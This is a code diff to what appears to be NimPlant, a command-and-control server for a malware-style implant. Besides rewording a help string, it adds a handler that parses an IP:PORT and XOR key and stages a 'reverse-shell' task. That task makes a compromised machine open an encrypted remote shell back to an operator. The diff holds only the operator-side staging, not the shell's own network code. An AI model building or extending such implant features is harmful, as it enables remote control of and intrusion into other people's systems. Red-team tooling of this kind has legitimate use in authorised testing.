@@ -29,7 +29,7 @@ def get_help_menu():
     res = "\n=== IMPLANT HELP ===\n"
     res += (
         "Command arguments shown as [required] <optional>.\n"
-        "Commands with (GUI) can be run without parameters via the web UI.\n\n"
+        "Commands with (GUI) can be run without parameters through the web UI.\n\n"
     )
     for c in commands_parser.get_commands():
         res += f"{c['command']:<18}{c['description']:<75}\n"
@@ -426,4 +426,43 @@ def process_screenshot(np: NimPlant, sc_blob) -> str:
         f.write(sc_blob)
 
     return f"Screenshot saved to '{path}'."
+
+
+# Handle pre-processing for the 'reverse-shell' command
+def reverse_shell(np: NimPlant, args, raw_command):
+    if len(args) < 2:
+        utils.nimplant_print(
+            "Invalid number of arguments received. Usage: 'reverse-shell <IP:PORT> <XOR_KEY>'.",
+            np.guid,
+            raw_command,
+        )
+        return
+
+    # First argument is IP:PORT
+    ip_port = args[0]
+    
+    # Second argument is XOR_KEY (required)
+    xor_key = args[1]
+    
+    # Validate XOR key format (decimal or hex)
+    try:
+        if xor_key.startswith("0x"):
+            # Hex format
+            int(xor_key[2:], 16)
+        else:
+            # Decimal format
+            int(xor_key)
+    except ValueError:
+        utils.nimplant_print(
+            "Invalid XOR key. Must be a number (decimal or hex with 0x prefix).",
+            np.guid,
+            raw_command,
+        )
+        return
+    
+    # Build command with arguments
+    command = ["reverse-shell", ip_port, xor_key]
+
+    guid = np.add_task(command, task_friendly=raw_command)
+    utils.nimplant_print("Staged reverse-shell command for Implant.", np.guid, task_guid=guid)
 
